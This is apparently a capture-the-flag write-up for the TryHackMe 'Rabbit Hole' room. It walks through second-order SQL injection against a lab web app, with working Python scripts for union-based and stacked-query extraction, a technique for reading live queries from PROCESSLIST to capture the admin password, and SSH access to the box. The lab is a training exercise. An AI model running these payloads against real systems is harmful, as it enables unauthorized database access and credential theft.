---
title: "TryHackMe: Rabbit Hole"
author: jaxafed
categories: [TryHackMe]
tags: [web, sql injection, mysql, python]
render_with_liquid: false
media_subpath: /images/tryhackme_rabbit_hole/
image:
  path: room_image.webp
---

**Rabbit Hole** was a room about exploiting a **second-order SQL injection** vulnerability to extract the currently running queries from the database. The goal was to discover a password embedded in a **SQL** query and use it with `SSH` to gain a shell and capture the flag.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/rabbitholeqq){: .center }

## Initial Enumeration

### Nmap Scan  

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.104.157
Nmap scan report for 10.10.104.157
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Your page title here :)
|_http-server-header: Apache/2.4.59 (Debian)
```

There are two ports open.

- **22** (`SSH`)  
- **80** (`HTTP`)

### Web 80

Looking at `http://10.10.104.157/`, we are greeted with a page containing links to **register** and **login**.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

We can register an account at `http://10.10.104.157/register.php`.

![Web 80 Register](web_80_register.webp){: width="1200" height="600" }

And we can login via `http://10.10.104.157/login.php`. While logging in, we notice an interesting note:  
`There are anti-bruteforce measures in place, implemented with database queries.`

![Web 80 Login](web_80_login.webp){: width="1200" height="600" }

Given the note and the fact that login attempts always take more than **5 seconds**, the application is likely using `SLEEP(5)` in the login query.

![Web 80 Login Two](web_80_login2.webp){: width="1200" height="600" }

## Discovering the SQL Injection

After logging in, we arrive at a page showing the last login times for users. Interestingly, the `admin` user logs into the application every minute.

![Web 80 Logins](web_80_logins.webp){: width="1200" height="600" }

In challenges, such automation often hints at a potential `XSS` vulnerability. Since the **username** is the only user-controlled input reflected on the page, we try registering and logging in with the following username:  

```html
<img src="http://10.11.72.22/test.jpg" />
```

The good news is that not only does our `XSS` payload work, but we can also see an error from the `MySQL` server. However, on our web server, we only see our machine requesting the image file from the `XSS` payload and nothing from the `admin` user.

![Web 80 Logins Two](web_80_logins2.webp){: width="1200" height="600" }

Since there were no issues during registration or login, and the `"` character in our payload only caused problems on the **last logins** page, this suggests a **second-order SQL injection** vulnerability. It seems the application incorrectly handles the username when fetching the last login records.

## Extracting Data

### Basic Automation for SQL Injection

Since registering a user, logging in, and fetching the last logins page manually is time-consuming, we can write a simple `python` script to automate the process.

```py
#!/usr/bin/env python3

import requests
import sys

url_base = sys.argv[1]
payload = sys.argv[2]

s = requests.session()
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
r = s.get(url_base)
print(r.text)
```
{: file="sqli_automate.py" }

Using the script to test for **union-based SQL injection**, we confirm that it works.

```console
$ ./sqli_automate.py 'http://10.10.104.157/' '" UNION SELECT 1;#'
...
<thead><th>User 6 - " UNION SELECT 1;# last logins</th></thead><tbody>
SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns</tbody></table>
...
```
{: .wrap }

Enumerating the column count in the query, we discover that there are two columns, with the second column being reflected in the output.

```console
$ ./sqli_automate.py 'http://10.10.104.157/' '" UNION SELECT 1,2;#'
...
<thead><th>User 10 - " UNION SELECT 1,2;# last logins</th></thead><tbody>
<tr><td>2</td></tr>
...
```

Since we have a working payload, we can begin enumerating the database, starting with the database names.

```console
$ ./sqli_automate.py 'http://10.10.104.157/' '" UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata;#'
...
<thead><th>User 11 - " UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata;# last logins</th></thead><tbody>
<tr><td>information_sche</td></tr>
...
```
{: .wrap }

When attempting to extract data from the database, we encounter a problem. Although the application displays the second column in our query, it only shows the first **16** characters.

### Enumerating the Database

We can address this problem by modifying our script to send our payload in a loop, extracting **16** characters at a time using the `SUBSTR` function in **MySQL**. Additionally, we can use `bs4` to parse the response and print only the part we are interested in.

```py
#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup

url_base = sys.argv[1]
payload = sys.argv[2]
index = 1

while True:
    sqli_payload = f'" UNION SELECT 1,SUBSTR(({payload}), {index}, 16);#'
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    r = s.get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    print(output, flush=True, end="")
    if len(output) < 16:
        break
    index += 16

print()
```
{: file="sqli_automate2.py" }

Running the script, we are able to discover the database names: `information_schema` and `web`.

```console
$ ./sqli_automate2.py 'http://10.10.104.157/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'
information_schema,web
```
{: .wrap }

Extracting the table names from the `web` database, we find two tables: `users` and `logins`.

```console
$ ./sqli_automate2.py 'http://10.10.104.157/' 'SELECT group_concat(table_name) FROM information_schema.tables where table_schema="web"'
users,logins
```
{: .wrap }

Extracting the column names for the `users` table, we find four columns: `id`, `username`, `password`, and `group`.

```console
$ ./sqli_automate2.py 'http://10.10.104.157/' 'SELECT group_concat(column_name) FROM information_schema.columns where table_schema="web" and table_name="users"'
id,username,password,group
```
{: .wrap }

Extracting the values from the `users` table:

> Since every payload creates a user and we know that the first user we created had the `id` of **4**, we are only extracting the first three users.
{: .prompt-tip }

> Additionally, we escape the `group` column name with `` ` `` because it is a reserved word in **MySQL**.
{: .prompt-tip }

```console
$ ./sqli_automate2.py 'http://10.10.104.157/' 'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users where id<4'
1:admin:0e3ab8e45ac1163c2343990e427c66ff:admin
2:foo:a51e47f646375ab6bf5dd2c42d3e6181:guest
3:bar:de97e75e5b4604526a2afaed5f5439d7:guest
```
{: .wrap }

While we are able to crack the hashes for the `foo` and `bar` users, they are not helpful, and we cannot crack the hash for the `admin` user.

There is still the `logins` table that we have not checked. However, upon extracting the column names, we see there are only two: `username` and `login_time`; neither of these is useful.

```console
$ ./sqli_automate2.py 'http://10.10.104.157/' 'SELECT group_concat(column_name) FROM information_schema.columns where table_schema="web" and table_name="logins"'
username,login_time
````
{: .wrap }

## Extracting the Current Queries

### Union-Based SQL Injection

While there is nothing particularly useful in the `web` database, we still have access to the `information_schema` database. One table in the `information_schema` that can greatly assist us is `PROCESSLIST`.

Using the `PROCESSLIST` table, we can query the currently running queries in the database. Since the `admin` user logs into the site every minute and there is a call to the `SLEEP` function in the login query, we have a five-second window every minute to read the login query from the table. If the password hashing for the user is not done in the `PHP` code but is instead passed to **MySQL** using the `MD5` function, we might be able to capture the password for the `admin` user.

However, there is one more hurdle to overcome. Currently, we are registering and logging in with a new account for each **16**-character block, which takes as long as the `admin` user's login query to run. With our current approach, we would only be able to extract the first **16** characters of the login query, if we're lucky.

Fortunately, our payload to extract the data does not execute while we are registering or logging in; it runs when we visit the last logins page. To solve this problem, we can modify our script once more, this time registering and logging in to the accounts beforehand and continuously extracting data by making requests to the last logins page with the already logged-in accounts afterward.

```py
#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import threading
import time

url_base = sys.argv[1]
payload = sys.argv[2]

sessions = {}
results = {}


def create_and_login(i, sqli_payload):
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    sessions[i] = s
    return


def fetch_query_result(i):
    r = sessions[i].get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    results[i] = output
    return


threads = []
for i in range(15):
    sqli_payload = f'" UNION SELECT 1, SUBSTR(({payload}), {i * 16 + 1}, 16);#'
    thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

while True:
    threads = [threading.Thread(target=fetch_query_result, args=(i,)) for i in range(15)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # check that we are not missing any part of the result
    if all([len(results[i]) <= len(results[i - 1]) for i in range(1, 15)]):
        result = "".join([results[i] for i in range(0, 15)])
        if len(result) > 16:
            print(result)
            sys.exit(0)
            
    time.sleep(1)
```
{: file="sqli_automate3.py" }

Running the script, we successfully discover the password for the `admin` user.

> We use `WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%"` to filter out our own query that extracts the data.
{: .prompt-tip }

```console
$ ./sqli_automate3.py 'http://10.10.104.157/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
SELECT * from users where (username= 'admin' and password=md5('fE[REDACTED]0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
```
{: .wrap }

> While the script works most of the time, it occasionally captures queries other than the login query. If you receive junk or different output, try running it again.  
{: .prompt-warning }

### Stacked Queries

While the above method works well, there is another approach—albeit more intrusive—that we can use to extract current queries without the **16** character limit.

The username field is not only vulnerable to `union-based` attacks, but it also supports `stacked queries`, which we can confirm with a payload like this:

```" UNION SELECT 1,2;DELETE FROM web.logins WHERE username="admin";#```

As we can see, we are able to delete the last login times for the `admin` user each time we make a request to the last logins page.

![Web 80 Stacked Queries](web_80_stacked_queries.webp){: width="600" height="500" }

Since both the `id` and `username` fields from the `users` table are reflected on the page, and we are using the `username` field for our payload, we can utilize the `id` field to extract data from the database.

This requires us to first modify the table and change the data type for `id` column from integer to string. After that, we can update the `id` field in the table with the currently running queries. For this, we can use the following script:

```py
#!/usr/bin/env python3

import requests
import re
import time
import sys

url_base = sys.argv[1]

# modify the data type for the id column
s = requests.session()
payload = f'" UNION SELECT 1,2; ALTER TABLE web.users MODIFY id VARCHAR(255); ALTER TABLE web.users DROP PRIMARY KEY;#'
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
s.get(url_base)

# create and log in with an account to update the id column with the current queries if it is not empty
s = requests.session()
payload = f'" UNION SELECT 1,2; UPDATE web.users SET id=(SELECT IFNULL(GROUP_CONCAT(INFO_BINARY),"1") FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%") WHERE username="admin";#'
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})

# constantly update the id field by fetching the last logins page and if it is not set to 1, print it and exit
while True:
    r = s.get(url_base)
    if "User 1 - admin" not in r.text:
        print(re.search(r"User (.*) - admin last logins", r.text).group(1))
        
        # after successful extraction, clean up the database
        payload = f'" UNION SELECT 1,2; DELETE FROM web.users WHERE username LIKE "%UNION SELECT 1,2%"; UPDATE web.users SET id="1" WHERE username="admin"; ALTER TABLE web.users MODIFY id INT PRIMARY KEY AUTO_INCREMENT;#'
        s = requests.session()
        s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
        s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
        s.get(url_base)

        break

    time.sleep(1)
```
{: file="sqli_stacked_queries.py" }


Running the script, we are able to extract the login query for the `admin` user and discover the password.

```console
$ ./sqli_stacked_queries.py 'http://10.10.104.157/'
SELECT * from users where (username= 'admin' and password=md5('fE[REDACTED]0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
```
{: .wrap }

## Shell as admin

Using the discovered password, we can **SSH** into the box as the `admin` user and read the flag at `/home/admin/flag.txt`.

```console
$ ssh admin@10.10.104.157
...
admin@ubuntu-jammy:~$ id
uid=1002(admin) gid=118(admin) groups=118(admin)
admin@ubuntu-jammy:~$ wc -c /home/admin/flag.txt
50 /home/admin/flag.txt
```

> After obtaining a shell, you can escalate to the `root` user with `sudo` to be able to read the source code for the web application at `/root/sqlinception/web/`.
{: .prompt-tip }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>